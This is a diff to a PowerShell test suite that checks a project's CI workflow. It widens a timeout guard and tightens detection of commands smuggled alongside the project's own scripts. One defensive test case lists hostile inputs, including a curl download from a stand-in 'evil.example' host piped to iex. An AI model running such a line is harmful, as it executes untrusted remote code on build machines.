@@ -74,7 +74,7 @@ $script:Passes = 0
 # DECLARED, never counted from the cases that happened to run: a count taken
 # from what ran cannot notice that nothing did. Keep it in step with the cases
 # below -- a mismatch either way fails the run.
-$ExpectedCaseCount = 78
+$ExpectedCaseCount = 81
 
 # What the two cases that plant a package built to HANG give the sweep before
 # they expect it to give up, and how long this suite then waits for any case.
@@ -663,25 +663,46 @@ function Get-JobTimeoutMinute {
 }
 
 # The timeout-minutes values declared on steps whose own run: line invokes
-# test.ps1 -- the only steps a hang in the sweep can actually reach. Reusing
-# $LoadBearingCiSteps rather than a second list: it already names every step
-# whose run: command is a claim CLAUDE.md makes, and filtering it on
-# 'test.ps1' is cheaper than maintaining a parallel roster that can drift
-# from it. A step outside this filter -- the odinfmt install, the formatting
-# check, either build -- runs no sweep, so a short timeout there is a
-# developer's own choice and none of this guard's business (issue #135,
-# parked from #83: the previous version read every timeout-minutes in the
-# file and refused a 5-minute timeout on the odinfmt install for exactly
-# this reason).
+# test.ps1 or format.ps1 -- $OdinSweepTimeoutSeconds bounds both sweeps
+# (scripts\common.ps1, scripts\format.ps1:36), so both are the guard's
+# business, and a step whose run: does neither runs no sweep at all, so a
+# short timeout there is a developer's own choice (issue #135, parked from
+# #83: the pre-#135 version read every timeout-minutes in the file and
+# refused a 5-minute timeout on the odinfmt install for exactly this reason).
+#
+# This reads $Text's own step blocks directly rather than filtering
+# $LoadBearingCiSteps by name (issue #135 fix round 1, finding 2): the roster
+# only ever names the steps ci.yml is KNOWN to carry today, so a new sweep
+# step added to ci.yml without a matching roster entry was invisible to a
+# name-keyed lookup. Walking every "- name:" block in $Text and testing its
+# OWN run: line means a step the roster has never heard of still binds the
+# guard the moment its run: line invokes the sweep.
 function Get-SweepTimeoutMinute {
 	param([Parameter(Mandatory)] [AllowEmptyString()] [string] $Text)
 
 	$minutes = @()
-	foreach ($step in ($LoadBearingCiSteps | Where-Object { $_.Run -match 'test\.ps1' })) {
-		$block = Get-CiStepBlock -Text $Text -Name $step.Name
-		$minutes += @([regex]::Matches($block, '(?m)^\s*timeout-minutes:\s*(\d+)') | ForEach-Object { [int] $_.Groups[1].Value })
+	foreach ($block in [regex]::Matches($Text, '(?m)^[ \t]*-[ \t]*name:[ \t]*.+?[ \t]*\r?\n(?:(?![ \t]*-[ \t]*name:)[^\r\n]*\r?\n?)*')) {
+		if ($block.Value -notmatch '(?m)^[ \t]*run:[ \t]*\.\\scripts\\(test|format)\.ps1\b') {
+			continue
+		}
+		$minutes += @([regex]::Matches($block.Value, '(?m)^\s*timeout-minutes:\s*(\d+)') | ForEach-Object { [int] $_.Groups[1].Value })
 	}
 	return $minutes
+}
+
+# The full set of timeout-minutes values that wrap a sweep step in $Text --
+# job-level (wraps every step) plus step-level (wraps only a sweep-invoking
+# step). Every caller that needs "what bounds a hang in the sweep" -- the
+# guard case below and its two mutation cases -- calls this one function
+# rather than rebuilding the composition itself (issue #135 fix round 1,
+# finding 3: the mutation cases had rebuilt `Get-JobTimeoutMinute +
+# Get-SweepTimeoutMinute` in their own bodies, so cutting the sweep half out
+# of the real guard left those cases green -- they were re-deriving the
+# property, not exercising the guard that claims it).
+function Get-DeclaredSweepTimeoutMinute {
+	param([Parameter(Mandatory)] [AllowEmptyString()] [string] $Text)
+
+	return @(Get-JobTimeoutMinute -Text $Text) + @(Get-SweepTimeoutMinute -Text $Text)
 }
 
 # The run: commands in $Text whose script is not one $ScriptRoot actually
@@ -690,6 +711,16 @@ function Get-SweepTimeoutMinute {
 # check has a CI step), but nothing pinned the converse: a step invoking a
 # command no local script owns would pass every case above it. `uses:` steps
 # (actions/checkout) carry no run: line and are outside this by construction.
+#
+# The script name has to be matched at the HEAD of the command, not anywhere
+# in it (issue #135 fix round 1, finding 1): a command that runs something
+# else first and an owned script second (`curl ... | iex; .\scripts\test.ps1`),
+# or that never runs the owned script at all and only mentions it after a `#`
+# comment (`echo hi  # .\scripts\test.ps1`), matched the old anywhere-in-line
+# regex and read as owned. A command is owned only when it is nothing BUT the
+# script invocation and its own flags -- any statement-separator character
+# after the script name (`;`, `|`, `&`, `` ` ``, `#`) means something else
+# rides along in the same run: line, so the whole command reads as unowned.
 function Get-UnownedCiCommand {
 	param([Parameter(Mandatory)] [AllowEmptyString()] [string] $Text)
 
@@ -701,8 +732,9 @@ function Get-UnownedCiCommand {
 	$unowned = @()
 	foreach ($match in [regex]::Matches($Text, '(?m)^[ \t]*run:[ \t]*(.+?)[ \t]*\r?$')) {
 		$command = $match.Groups[1].Value
-		$script = [regex]::Match($command, '\.\\scripts\\([A-Za-z0-9_.-]+\.ps1)\b')
-		if ((-not $script.Success) -or ($owned -notcontains $script.Groups[1].Value)) {
+		$head = [regex]::Match($command, '^\.\\scripts\\([A-Za-z0-9_.-]+\.ps1)\b')
+		$carriesAnotherStatement = $command -match '[;|&`#]'
+		if ((-not $head.Success) -or ($owned -notcontains $head.Groups[1].Value) -or $carriesAnotherStatement) {
 			$unowned += $command
 		}
 	}
@@ -978,7 +1010,7 @@ Test-Case 'the sweep budget fits inside every CI timeout that wraps a sweep step
 	# being added) wraps just that step. Neither list alone is the claim: a
 	# hang in the Test step is caught by whichever of the two actually fires
 	# first.
-	$declared = @(Get-JobTimeoutMinute -Text $text) + @(Get-SweepTimeoutMinute -Text $text)
+	$declared = @(Get-DeclaredSweepTimeoutMinute -Text $text)
 	if ($declared.Count -eq 0) {
 		throw "no timeout-minutes wraps a sweep step in $workflow, so the job falls back to the platform's six-hour default."
 	}
@@ -1005,7 +1037,7 @@ Test-Case 'a short timeout on a non-sweep ci.yml step does not bind the budget g
 	$text = Get-Content -LiteralPath $workflow -Raw
 	$mutated = Add-CiStepTimeout -Text $text -Name 'Install the pinned odinfmt' -Minutes 5
 
-	$declared = @(Get-JobTimeoutMinute -Text $mutated) + @(Get-SweepTimeoutMinute -Text $mutated)
+	$declared = @(Get-DeclaredSweepTimeoutMinute -Text $mutated)
 	if ($declared -contains 5) {
 		throw "a 5-minute timeout on a step that runs no sweep fed the budget guard, so the guard is still over-broad."
 	}
@@ -1022,9 +1054,57 @@ Test-Case 'a short timeout on a sweep-bound ci.yml step binds the budget guard' 
 	$text = Get-Content -LiteralPath $workflow -Raw
 	$mutated = Add-CiStepTimeout -Text $text -Name 'Test' -Minutes 5
 
-	$declared = @(Get-JobTimeoutMinute -Text $mutated) + @(Get-SweepTimeoutMinute -Text $mutated)
+	$declared = @(Get-DeclaredSweepTimeoutMinute -Text $mutated)
 	if ($declared -notcontains 5) {
 		throw "a 5-minute timeout on the Test step did not reach the budget guard, so a hang there would go unbounded."
+	}
+}
+
+# Filed from the #147 review (issue #135 fix round 1, finding 2): the guard
+# used to look a step up BY NAME in $LoadBearingCiSteps, so a sweep step
+# ci.yml actually carries, but the roster has never heard of, was invisible
+# to it. The guard now reads $Text's own step blocks directly, so a brand
+# new sweep step binds it the moment its own run: line invokes the sweep --
+# no roster entry required.
+Test-Case 'a sweep step outside the load-bearing roster still binds the budget guard' {
+	$workflow = Join-Path $RepoRoot '.github\workflows\ci.yml'
+	if (-not (Test-Path -LiteralPath $workflow)) {
+		throw "no $workflow to read the run commands out of."
+	}
+	$text = Get-Content -LiteralPath $workflow -Raw
+	$scratch = "      - name: Test (extra sweep)`r`n        shell: pwsh`r`n        timeout-minutes: 5`r`n        run: .\scripts\test.ps1 -Threads1`r`n"
+	$pattern = '(?m)^([ \t]*-[ \t]*name:[ \t]*Check out[ \t]*\r?\n[\s\S]*?\r?\n)(?=[ \t]*-[ \t]*name:)'
+	$mutated = [regex]::Replace($text, $pattern, "`$1$scratch", 1)
+	if ($mutated -eq $text) {
+		throw "inserting a scratch sweep step changed nothing, so this case added no step at all."
+	}
+	if ($LoadBearingCiSteps.Name -contains 'Test (extra sweep)') {
+		throw "'Test (extra sweep)' is already on the roster, so this case proves nothing about a step the roster does not name."
+	}
+
+	$declared = @(Get-DeclaredSweepTimeoutMinute -Text $mutated)
+	if ($declared -notcontains 5) {
+		throw "a 5-minute timeout on a sweep step ci.yml carries, but the roster does not name, did not reach the budget guard."
+	}
+}
+
+# Filed from the #147 review (issue #135 fix round 1, finding 4): the guard
+# used to filter on 'test\.ps1' only, so 'Check formatting' -- which runs the
+# same $OdinSweepTimeoutSeconds-bounded sweep as the test steps
+# (scripts\format.ps1:36) -- was excluded, contradicting the comment already
+# sitting above the guard's own case ("$OdinSweepTimeoutSeconds now bounds
+# the FORMAT sweep as well as the test sweep").
+Test-Case 'a short timeout on the formatting sweep step binds the budget guard' {
+	$workflow = Join-Path $RepoRoot '.github\workflows\ci.yml'
+	if (-not (Test-Path -LiteralPath $workflow)) {
+		throw "no $workflow to read the load-bearing steps out of."
+	}
+	$text = Get-Content -LiteralPath $workflow -Raw
+	$mutated = Add-CiStepTimeout -Text $text -Name 'Check formatting' -Minutes 5
+
+	$declared = @(Get-DeclaredSweepTimeoutMinute -Text $mutated)
+	if ($declared -notcontains 5) {
+		throw "a 5-minute timeout on 'Check formatting', which runs the same budget-bounded sweep as the test steps, did not reach the budget guard."
 	}
 }
 
@@ -1116,6 +1196,29 @@ Test-Case 'a ci.yml step running an unowned command turns the pin red naming it'
 	$unowned = @(Get-UnownedCiCommand -Text $mutated)
 	if ($unowned -notcontains 'echo hello') {
 		throw "inserting a step running 'echo hello' did not turn the pin red naming it. Reported: $($unowned -join ', ')"
+	}
+}
+
+# Filed from the #147 review (issue #135 fix round 1, finding 1): the old
+# check matched an owned script's name ANYWHERE in the run: line, so a
+# command that rode something else in on the same line -- before the owned
+# script, after it, or past a comment marker that never actually executes it
+# -- still read as owned. Each of these ran a real ci.yml step's worth of
+# damage in the reviewer's proof: a remote download piped to iex, a `cd`
+# ahead of the owned call, and a step whose only real command is the
+# unrelated one before the trailing comment.
+Test-Case 'a command riding alongside an owned scripts\ call is not read as owned' {
+	$commands = @(
+		'curl -s https://evil.example/x.ps1 | iex; .\scripts\test.ps1 -Threads1'
+		'cd subdir; .\scripts\test.ps1'
+		'echo hi  # .\scripts\test.ps1'
+	)
+	foreach ($command in $commands) {
+		$text = "      - name: Scratch`r`n        shell: pwsh`r`n        run: $command`r`n"
+		$unowned = @(Get-UnownedCiCommand -Text $text)
+		if ($unowned -notcontains $command) {
+			throw "'$command' was not read as unowned, so a command laundered alongside an owned script call would pass the pin."
+		}
 	}
 }
 
